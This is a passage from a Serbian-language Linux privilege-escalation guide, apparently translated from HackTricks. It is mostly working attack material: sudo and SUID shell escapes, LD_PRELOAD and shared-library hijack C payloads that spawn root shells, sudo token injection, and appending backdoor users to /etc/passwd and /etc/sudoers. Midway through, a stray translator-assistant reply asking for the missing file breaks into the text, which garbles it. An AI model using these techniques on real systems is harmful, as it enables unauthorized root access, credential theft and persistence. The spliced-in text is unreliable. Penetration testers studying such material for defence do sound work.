timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** se nalaze u sistemu, koji mogu da se **login** i koji imaju **root privilegije**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linux-a su bile pogođene greškom koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proverite da li se nešto zanimljivo nalazi u clipboard-u (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate neku lozinku** iz okruženja, **pokušajte da se ulogujete kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta da pravite mnogo buke i ako su binarni fajlovi `su` i `timeout` prisutni na računaru, možete pokušati da brute-force korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` takođe pokušava brute-force korisnike.

## Zloupotrebe upisivog $PATH-a

### $PATH

Ako otkrijete da možete **pisati u neki folder iz $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u upisivom folderu** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **se neće učitati iz foldera koji se nalazi pre vašeg upisivog foldera u $PATH**.

### SUDO and SUID

Može vam biti dozvoljeno da izvršite neku komandu koristeći sudo, ili neke binarne mogu imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili pišete datoteke ili čak izvršavate komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh key u root direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **based on HTB machine Admirer**, bio je **vulnerable** na **PYTHONPATH hijacking** koji је омогућавао учитaвање произвољне python библиотеке док се скрипта извршава као root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan preko sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri neinteraktivnom pokretanju da izvršite proizvoljan kod kao root pri pozivanju dozvoljene komande.

- Zašto ovo radi: Za neinteraktivne shelove, Bash evaluira `$BASH_ENV` i učitava (sources) taj fajl pre nego što pokrene ciljani skript. Mnoge sudo politike dozvoljavaju pokretanje skripta ili shell wrapper-a. Ako sudo sačuva `BASH_ENV`, vaš fajl će biti učitan sa root privilegijama.

- Zahtevi:
- Pravilo u sudo koje možete izvršiti (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koji bash skript).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Pojačavanje bezbednosti:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte shell wrappers za sudo-allowed komande; koristite minimalne binarne.
- Razmotrite sudo I/O logging i alerting kada se koriste preserved env vars.

### Putevi za zaobilaženje izvršavanja putem sudo

**Skočite** da pročitate druge fajlove ili koristite **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), to je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protumere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komanda/SUID binarni fajl bez putanje komande

Ako je korisniku dodeljena **sudo dozvola** za jednu komandu **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti menjajući PATH promenljivu.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj čudnog SUID binary-ja)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možete pokušati da **export a function** sa imenom komande koju suid fajl poziva.

Na primer, ako **suid** binary poziva _**/usr/sbin/service apache2 start**_, treba da pokušate da create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** koristi se za specificiranje jedne ili više shared biblioteka (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading biblioteke.

Međutim, da bi se održala sigurnost sistema i sprečilo zloupotrebljavanje ove funkcije, posebno kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde se real user ID (_ruid_) ne poklapa sa effective user ID (_euid_).
- Za izvršne fajlove sa suid/sgid, preučitavaju se samo biblioteke iz standardnih puteva koje su takođe suid/sgid.

Privilege escalation može da se dogodi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** ostane sačuvana i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može biti zloupotrebljen ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer on kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarni fajl sa **SUID** permisijama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku kao _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za eksploataciju.

Da bi se ovo iskoristilo, pristup bi bio kreiranje C fajla, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, nakon kompajliranja i izvršavanja, ima za cilj eskalaciju privilegija menjajući dozvole fajlova i pokretanjem shell sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl koristeći:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary-ja trebalo bi да pokrene exploit, omogućavajući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binarni fajl koji učitava biblioteku iz direktorijuma u koji možemo pisati, napravimo biblioteku u tom direktorijumu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da ima funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubacivati argumente** u komandu.

Projekat sakuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti da se pobegne iz ograničenih shell-ova, eskaliraju ili održe povišene privilegije, prenose fajlovi, pokreću bind i reverse shell-ovi i olakšavaju druge post-exploitation zadatke.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da izvršite `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li nalazi način kako da iskoristi neku sudo pravilo.

### Ponovna upotreba sudo tokena

U slučajevima kada imate **sudo access** ali ne i lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i potom preuzeti session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno menjajući `/etc/sysctl.d/10-ptrace.conf` i postavljajući `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u tom folderu ili na bilo kojem fajlu kreiranom u okviru foldera, možete koristiti binarni [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **napravite sudo token za user i PID**.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj user sa PID-om 1234, možete **dobiti sudo privileges** bez potrebe da znate password izvršavanjem:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Datoteka `/etc/sudoers` i datoteke unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. **Po defaultu ove datoteke mogu čitati samo korisnik root i grupa root**.\
**Ako** možete da **read** ovaj fajl, mogli biste da dobijete neke interesantne informacije, a ako možete da **write** bilo koju datoteku, moći ćete da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative `sudo` binarnom fajlu, kao što je `doas` za OpenBSD; obavezno proverite konfiguraciju u `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija i dobijete shell u tom korisničkom kontekstu, možete **napraviti novi sudo executable** koji će izvršiti vaš kod kao root, a zatim komandu korisnika. Zatim, **izmenite $PATH** korisničkog konteksta (na primer dodavanjem nove putanje u .bash_profile) tako da kada korisnik pokrene sudo, vaš sudo executable bude izvršen.

Napomena: ako korisnik koristi drugačiji shell (ne bash), moraćete da izmenite druge fajlove da biste dodali novu putanju. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Datoteka `/etc/ld.so.conf` pokazuje **odakle potiču učitane konfiguracione datoteke**. Obično ova datoteka sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti pročitane. Ove konfiguracione datoteke **pokazuju na druge foldere** gde će se **biblioteke** **tražiti**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **a user has write permissions** na bilo koji od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koja datoteka unutar `/etc/ld.so.conf.d/` ili bilo koji direktorijum na koji ukazuju konfiguracione datoteke unutar `/etc/ld.so.conf.d/*.conf`, korisnik može biti u mogućnosti da escalate privileges.\
Pogledajte **how to exploit this misconfiguration** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` biće korišćen od strane programa na ovom mestu kako je specificirano u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` koristeći `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities obezbeđuju **podskup dostupnih root privilegija procesu**. Ovo efikasno razbija root **privilegije na manje i različite jedinice**. Svaka od ovih jedinica može se nezavisno dodeliti procesima. Na taj način se smanjuje ukupan skup privilegija, čime se umanjuje rizik od eksploatacije.\
Pročitaj sledeću stranicu da **saznaš više o capabilities i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

U direktorijumu, **bit za "execute"** implicira da pogođeni korisnik može da se **"cd"** u taj folder.\
**"Read"** bit implicira da korisnik može da **lista** **fajlove**, a **"write"** bit implicira da korisnik može da **obriše** i **kreira** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlu ili direktorijumu dopuštajući ili odbijajući prava određenim korisnicima koji nisu vlasnici niti članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Dodatne informacije mogu se naći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeli** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pribavi** fajlove sa određenim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **starim verzijama** možete izvršiti **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da **connect** samo na screen sessions **svojem korisniku**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Poveži se sa sesijom**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim tmux verzijama**. Nisam mogao da preuzmem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovan korisnik.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Pridruži se sesiji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Proveri **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na Debian based sistemima (Ubuntu, Kubuntu, etc) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bugom.\
Ovaj bug nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je **bilo moguće samo 32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i **ako imate ssh javni ključ možete potražiti odgovarajući privatni ključ**. Izračunate mogućnosti možete naći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Određuje da li je autentikacija pomoću lozinke dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je autentikacija javnim ključem dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li se root može prijaviti preko ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i privatni ključ
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću privatnog ključa
- `forced-commands-only`: Root se može prijaviti samo koristeći privatni ključ i ako su navedene opcije za komande
- `no` : ne

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji se mogu koristiti za autentikaciju korisnika. Može sadržati tokene kao `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (počinjući sa `/`) ili **relativne putanje iz home direktorijuma korisnika**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija znači da, ako pokušate da se prijavite pomoću **private** ključa korisnika "**testusername**", ssh će uporediti public key vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) na vašem serveru. Tako ćete moći da **jump** putem ssh **to a host** i odatle **jump to another** host **using** the **key** located in your **initial host**.

Morate podesiti ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, taj host će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **prebrisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.  
Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (default is allow).

Ako otkrijete da je Forward Agent konfigurisana u okruženju, pročitajte sledeću stranicu jer **možda ćete moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Fajlovi profila

Fajl `/etc/profile` i fajlovi u okviru `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete **da pišete ili izmenite bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka čudna skripta profila, treba je proveriti zbog **osetljivih podataka**.

### Passwd/Shadow datoteke

U zavisnosti od operativnog sistema, datoteke `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati rezervna kopija. Zato se preporučuje **pronaći ih sve** i **proveriti da li ih možete pročitati** da biste videli **da li postoje hashes** u datotekama:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u fajlu `/etc/passwd` (ili ekvivalentnom).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Niste priložili sadržaj fajla src/linux-hardening/privilege-escalation/README.md. Pošaljite sadržaj tog fajla da bih mogao da prevedem relevantni tekst na srpski, zadržavajući postojeću markdown/html sintaksu i pravila iz uputstva.

Takođe pojasnite ovo:
- Da li želite da u prevedeni README ubacim novu sekciju koja govori da se doda korisnik `hacker` i da se prikaže generisana lozinka?
- Želite li da generišem i prikažem lozinku u README (plain text) ili samo da dam komandu/primer kako je dodati na sistem?

Napomena: ne mogu da izvršavam komande na vašem sistemu — mogu samo da generišem sadržaj i/ili komande koje treba da pokrenete (npr. useradd, passwd).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može smanjiti trenutni nivo bezbednosti mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive fajlove**. Na primer, možete li upisati u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na пример, ако машина покреће **tomcat** server и можете **изменити Tomcat service configuration file inside /etc/systemd/,** онда можете изменити следеће линије:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor biće izvršen sledeći put kada se tomcat pokrene.

### Proverite direktorijume

Sledeći direktorijumi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudna lokacija/Owned fajlovi
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjeni fajlovi u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml datoteke
```bash
